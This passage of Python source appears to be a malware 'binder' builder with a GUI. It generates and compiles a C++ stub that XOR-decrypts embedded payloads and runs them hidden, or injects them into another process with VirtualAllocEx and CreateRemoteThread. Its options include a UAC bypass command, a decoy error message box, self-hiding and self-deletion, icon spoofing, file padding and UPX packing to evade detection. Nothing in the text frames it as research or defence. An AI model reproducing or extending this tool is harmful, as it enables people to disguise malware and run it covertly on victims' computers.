        msgbox_type_map = {
            "Error": "MB_OK | MB_ICONERROR", "Ошибка": "MB_OK | MB_ICONERROR", "Помилка": "MB_OK | MB_ICONERROR",
            "Information": "MB_OK | MB_ICONINFORMATION", "Информация": "MB_OK | MB_ICONINFORMATION", "Інформація": "MB_OK | MB_ICONINFORMATION",
            "Warning": "MB_OK | MB_ICONWARNING", "Предупреждение": "MB_OK | MB_ICONWARNING", "Попередження": "MB_OK | MB_ICONWARNING"
        }
        msgbox_type_constant = msgbox_type_map.get(kwargs['msgbox_type'], "MB_OK | MB_ICONERROR")
        msgbox_logic = f'pMessageBoxA(NULL, "{msg_text_escaped}", "{msg_title_escaped}", {msgbox_type_constant});' if kwargs['use_msgbox'] else ''
        
        self_hide_logic = 'pSetFileAttributesA(own_path, FILE_ATTRIBUTE_HIDDEN);' if kwargs['self_hide'] else ''
        # CORRECTED: Self-destruct command with proper escaping for wsprintfA
        self_destruct_command = 'cmd.exe /c timeout /t 3 /nobreak > NUL && del \\"%s\\"'
        self_destruct_logic = f'char cmd[MAX_PATH*2]; wsprintfA(cmd, "{self_destruct_command}", own_path); WinExec(cmd, SW_HIDE);' if kwargs['self_destruct'] else ''

        file1_load_logic = f"""
    unsigned long file1_offset = {kwargs['file1_offset']}UL;
    unsigned long file1_size = {kwargs['file1_size']}UL;
    std::vector<unsigned char> file1_data_vec(file1_size);
    DWORD bytesRead;
    SetFilePointer(hSelf, file1_offset, NULL, FILE_BEGIN);
    ReadFile(hSelf, file1_data_vec.data(), file1_size, &bytesRead, NULL);
    XorCrypt(file1_data_vec.data(), file1_size, xor_key);
"""
        file2_load_logic = ""
        if kwargs['file2_size'] > 0:
            file2_load_logic = f"""
    unsigned long file2_offset = {kwargs['file2_offset']}UL;
    unsigned long file2_size = {kwargs['file2_size']}UL;
    std::vector<unsigned char> file2_data_vec(file2_size);
    SetFilePointer(hSelf, file2_offset, NULL, FILE_BEGIN);
    ReadFile(hSelf, file2_data_vec.data(), file2_size, &bytesRead, NULL);
    XorCrypt(file2_data_vec.data(), file2_size, xor_key);
"""
        # CORRECTED: UAC bypass command template for C++
        uac_bypass_cmd_template_cpp = '/C set __COMPAT_LAYER=runasinvoker && start \\"\\" \\"%s\\"'

        file1_exec_logic = ""
        if kwargs['use_injection']:
            file1_exec_logic = f"""
    char target_process[] = "{target_proc_escaped}";
    STARTUPINFOA si = {{0}}; PROCESS_INFORMATION pi = {{0}}; si.cb = sizeof(si);
    if (pCreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {{
        LPVOID remote_mem = pVirtualAllocEx(pi.hProcess, NULL, file1_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remote_mem) {{
            pWriteProcessMemory(pi.hProcess, remote_mem, file1_data_vec.data(), file1_size, NULL);
            pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
        }}
        pResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }}
"""
        else:
            file1_exec_logic = f"""
    std::string path1 = extractDir + "{file1_filename_escaped}";
    if (WriteFileToDisk(path1, file1_data_vec.data(), file1_size)) {{
        {'char uac_cmd_file1[MAX_PATH * 2]; wsprintfA(uac_cmd_file1, "' + uac_bypass_cmd_template_cpp + '", path1.c_str()); pShellExecuteA(NULL, "open", "cmd.exe", uac_cmd_file1, NULL, SW_HIDE);' if kwargs['use_uac_bypass'] and kwargs['uac_bypass_payload'] == 'file1' else f'pShellExecuteA(NULL, "open", path1.c_str(), NULL, NULL, {kwargs["show_cmd1"]});'}
    }}
"""
        file2_exec_logic = ""
        if kwargs['file2_size'] > 0:
            file2_exec_logic = f"""
    std::string path2 = extractDir + "{file2_filename_escaped}";
    if (WriteFileToDisk(path2, file2_data_vec.data(), file2_size)) {{
        {'char uac_cmd_file2[MAX_PATH * 2]; wsprintfA(uac_cmd_file2, "' + uac_bypass_cmd_template_cpp + '", path2.c_str()); pShellExecuteA(NULL, "open", "cmd.exe", uac_cmd_file2, NULL, SW_HIDE);' if kwargs['use_uac_bypass'] and kwargs['uac_bypass_payload'] == 'file2' else f'pShellExecuteA(NULL, "open", path2.c_str(), NULL, NULL, {kwargs["show_cmd2"]});'}
    }}
"""

        return f"""
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <direct.h>
#include <shellapi.h>

// Typedefs for dynamically loaded functions
typedef int (WINAPI* MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
typedef BOOL (WINAPI* SetFileAttributesA_t)(LPCSTR, DWORD);
typedef LPVOID (WINAPI *VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
typedef HANDLE (WINAPI *CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *ResumeThread_t)(HANDLE);
typedef void (WINAPI *Sleep_t)(DWORD);
typedef HINSTANCE (WINAPI *ShellExecuteA_t)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HANDLE (WINAPI* CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD (WINAPI* SetFilePointer_t)(HANDLE, LONG, PLONG, DWORD);

const char* xor_key = "{xor_key}";
const char* extract_subdir = "{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}\\\\";

void XorCrypt(unsigned char* data, size_t size, const char* key) {{
    size_t key_len = strlen(key);
    for (size_t i = 0; i < size; ++i) data[i] ^= key[i % key_len];
}}
bool WriteFileToDisk(const std::string& path, unsigned char* data, size_t size) {{
    std::ofstream outfile(path, std::ios::binary);
    if (!outfile) return false;
    if (size > 0) outfile.write(reinterpret_cast<const char*>(data), size);
    outfile.close(); return outfile.good();
}}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {{
    {anti_debug_logic}

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE u32 = LoadLibraryA("user32.dll");
    HMODULE s32 = LoadLibraryA("shell32.dll");
    
    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(u32, "MessageBoxA");
    SetFileAttributesA_t pSetFileAttributesA = (SetFileAttributesA_t)GetProcAddress(k32, "SetFileAttributesA");
    ShellExecuteA_t pShellExecuteA = (ShellExecuteA_t)GetProcAddress(s32, "ShellExecuteA");
    CreateProcessA_t pCreateProcessA = (CreateProcessA_t)GetProcAddress(k32, "CreateProcessA");
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(k32, "VirtualAllocEx");
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(k32, "WriteProcessMemory");
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(k32, "CreateRemoteThread");
    ResumeThread_t pResumeThread = (ResumeThread_t)GetProcAddress(k32, "ResumeThread");
    CreateFileA_t pCreateFileA = (CreateFileA_t)GetProcAddress(k32, "CreateFileA");
    ReadFile_t pReadFile = (ReadFile_t)GetProcAddress(k32, "ReadFile");
    SetFilePointer_t pSetFilePointer = (SetFilePointer_t)GetProcAddress(k32, "SetFilePointer");
    Sleep_t pSleep = (Sleep_t)GetProcAddress(k32, "Sleep");

    char own_path[MAX_PATH];
    GetModuleFileNameA(NULL, own_path, MAX_PATH);

    HANDLE hSelf = pCreateFileA(own_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) return 1;

    {msgbox_logic}
    {self_hide_logic}

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string extractDir = std::string(tempPath) + extract_subdir;
    _mkdir(extractDir.c_str());

    // Payload 1 loading and execution
    {file1_load_logic}
    {file1_exec_logic}
    
    // Payload 2 loading and execution (if exists)
    {file2_load_logic}
    {file2_exec_logic}
    
    CloseHandle(hSelf);

    if(pSleep) pSleep(1000);

    {self_destruct_logic}

    return 0;
}}
"""

    def _run_command(self, command, log=True):
        if log: self._log('log_command', cmd=' '.join(command))
        # Use CREATE_NO_WINDOW to prevent console from flashing
        process = subprocess.run(command, capture_output=True, text=True, encoding='oem', errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
        if process.returncode != 0 and log:
            self._log('log_error_command', error=(process.stderr or process.stdout))
        return process

    def _process_files(self):
        self.log_area.clear()
        log_art = """  _          _                    _           _       _       
 | |        | |                  | |         | |     | |      
 | |     ___| | ___  _ __   __ _ | |__   ___ | |_    | | ___  
 | |    / _ \\ |/ _ \\| '_ \\ / _` || '_ \\ / _ \\| __|   | |/ _ \\ 
 | |___|  __/ |  __/| | | | (_| || |_) |  __/| |_    | | (_) |
 |______\\___|_|\\___||_| |_|\\__,_||_.__/ \\___| \\__|   |_|\\___/ 
                                                             
                                                             """
        self.log_area.append(log_art)
        
        # --- STAGE 1: VALIDATION ---
        self._log("log_stage1")
        
        file1_path = self.file1_path_edit.text()
        output_path = self.output_path_edit.text()
        
        if not all([file1_path, output_path]):
            self._log("log_error_mandatory_fields")
            self._play_sound("sounds/fail.mp3")
            return

        compiler_path = get_resource_path(os.path.join("bin", "g++.exe"))
        if not os.path.exists(compiler_path):
            self._log("log_error_compiler_not_found", path=compiler_path)
            self._play_sound("sounds/fail.mp3")
            return

        temp_files = []
        try:
            # --- STAGE 2: DATA PREPARATION ---
            self._log("log_stage2")
            xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            
            with open(file1_path, 'rb') as f:
                data1 = f.read()
            encrypted_data1 = self._xor_crypt(data1, xor_key)
            file1_size = len(encrypted_data1)
            file1_filename = os.path.basename(file1_path)

            encrypted_data2, file2_size, file2_filename = b'', 0, ""
            file2_path = self.file2_path_edit.text()
            if file2_path and os.path.exists(file2_path):
                with open(file2_path, 'rb') as f:  
                    data2 = f.read()
                encrypted_data2 = self._xor_crypt(data2, xor_key)
                file2_size = len(encrypted_data2)
                file2_filename = os.path.basename(file2_path)
            self._log("log_data_encrypted")

            # Collect options from UI
            msgbox_type_text = self.msgbox_type_combo.currentText()
            uac_bypass_payload_map = {0: "none", 1: "file1", 2: "file2"}
            uac_bypass_payload_selection = uac_bypass_payload_map[self.uac_bypass_payload_combo.currentIndex()] if self.uac_bypass_checkbox.isChecked() else "none"

            # --- STAGE 3: COMPILATION ---
            # This is now a more robust two-step process.
            self._log("log_stage3")
            
            # First, compile with 0 offsets to get the exact size of the compiled stub.
            # This stub is temporary and will be deleted.
            temp_stub_path = output_path + ".stub.tmp"
            temp_files.append(temp_stub_path)
            
            cpp_code_pre = self._generate_cpp_code(
                file1_offset=0, file1_size=file1_size, file1_filename=file1_filename,
                show_cmd1="SW_HIDE" if self.file1_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
                file2_offset=0, file2_size=file2_size, file2_filename=file2_filename,
                show_cmd2="SW_HIDE" if self.file2_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
                xor_key=xor_key, use_anti_debug=self.anti_debug_checkbox.isChecked(),
                use_injection=self.injection_checkbox.isChecked(), target_proc=self.injection_target_edit.text(),
                use_msgbox=self.msgbox_checkbox.isChecked(), msgbox_type=msgbox_type_text,
                msg_title=self.msgbox_title_edit.text(), msg_text=self.msgbox_text_edit.text(),
                self_hide=self.self_hide_checkbox.isChecked(), self_destruct=self.self_destruct_checkbox.isChecked(),
                use_uac_bypass=self.uac_bypass_checkbox.isChecked(), uac_bypass_payload=uac_bypass_payload_selection
            )
            
            temp_cpp_file = "temp_binder.cpp"
            temp_files.append(temp_cpp_file)
            with open(temp_cpp_file, 'w', encoding='utf-8') as f: f.write(cpp_code_pre)

            command_pre = [compiler_path, temp_cpp_file, '-o', temp_stub_path, '-s', '-static', '-mwindows']
            if self._run_command(command_pre).returncode != 0:
                raise Exception("Initial stub compilation failed.")

            # Now we have the exact size, so we can calculate the final offsets.
            stub_size = os.path.getsize(temp_stub_path)
            file1_offset = stub_size
            file2_offset = file1_offset + file1_size

            # Generate the C++ code again with the REAL offsets and recompile to the final destination.
            cpp_code_final = self._generate_cpp_code(
                file1_offset=file1_offset, file1_size=file1_size, file1_filename=file1_filename,
                show_cmd1="SW_HIDE" if self.file1_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
                file2_offset=file2_offset, file2_size=file2_size, file2_filename=file2_filename,
                show_cmd2="SW_HIDE" if self.file2_hide_checkbox.isChecked() else "SW_SHOWNORMAL",
                xor_key=xor_key, use_anti_debug=self.anti_debug_checkbox.isChecked(),
                use_injection=self.injection_checkbox.isChecked(), target_proc=self.injection_target_edit.text(),
                use_msgbox=self.msgbox_checkbox.isChecked(), msgbox_type=msgbox_type_text,
                msg_title=self.msgbox_title_edit.text(), msg_text=self.msgbox_text_edit.text(),
                self_hide=self.self_hide_checkbox.isChecked(), self_destruct=self.self_destruct_checkbox.isChecked(),
                use_uac_bypass=self.uac_bypass_checkbox.isChecked(), uac_bypass_payload=uac_bypass_payload_selection
            )
            with open(temp_cpp_file, 'w', encoding='utf-8') as f: f.write(cpp_code_final)
            self._log("log_cpp_generated")

            command_final = [compiler_path, temp_cpp_file, '-o', output_path, '-s', '-static', '-mwindows']
            if self._run_command(command_final).returncode != 0:
                raise Exception("Final compilation with offsets failed.")
            self._log("log_main_compile_ok")

            # --- STAGE 4: MODIFYING RESOURCES ---
            self._log("log_stage4")
            icon_path = self.icon_path_edit.text()
            if icon_path and os.path.exists(icon_path):
                rcedit_path = get_resource_path(os.path.join("bin", "rcedit-x64.exe"))
                if os.path.exists(rcedit_path):
                    cmd = [rcedit_path, "--set-icon", icon_path, output_path]
                    if self._run_command(cmd).returncode == 0:
                        self._log("log_set_icon_ok")
                else:
                    self._log("log_error_rcedit_not_found", path=rcedit_path)

            # --- STAGE 5: APPENDING PAYLOADS ---
            self._log("log_stage5")
            with open(output_path, 'ab') as f_out:
                f_out.write(encrypted_data1)
                if encrypted_data2:
                    f_out.write(encrypted_data2)
            self._log("log_append_ok")
            
            # --- STAGE 6: PUMPING FILE ---
            if self.pump_checkbox.isChecked():
                self._log("log_stage6")
                try:
                    target_size = self.pump_size_spinbox.value() * 1024 * 1024
                    current_size = os.path.getsize(output_path)
                    if target_size > current_size:
                        with open(output_path, 'ab') as f: f.write(b'\0' * (target_size - current_size))
                        self._log("log_pump_success", size=self.pump_size_spinbox.value())
                    else: self._log("log_pump_warn_size")
                except Exception as e: self._log("log_pump_error", e=e)

            # --- STAGE 7: PACKING WITH UPX ---
            if self.upx_checkbox.isChecked():
                self._log("log_stage7")
                upx_path = get_resource_path("bin/upx.exe")
                # CORRECTED: Logic for checking if UPX exists
                if os.path.exists(upx_path):
                    upx_level = f"-{self.upx_level_combo.currentText()}"
                    command = [upx_path, upx_level, '--force', output_path]
                    if self._run_command(command).returncode == 0:
                        self._log("log_upx_pack_ok")
                    else:
                        self._log("log_upx_error")
                else:
                    self._log("log_error_upx_not_found", path=upx_path)

            self._log("log_final_success", path=os.path.abspath(output_path))
            self._play_sound("sounds/tada.mp3")
            
        except Exception as e:
            self._log("log_critical_error", e=e)
            self._play_sound("sounds/fail.mp3")
            
        finally:
            # --- STAGE 8: CLEANUP ---
            self._log("log_stage8")
            for f in temp_files:
                if os.path.exists(f):
                    try: 
                        os.remove(f)
                        self._log("log_file_deleted", file=f)
                    except OSError: 
                        pass

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = LambdaJoinerApp()
    ex.show()
    sys.exit(app.exec_())
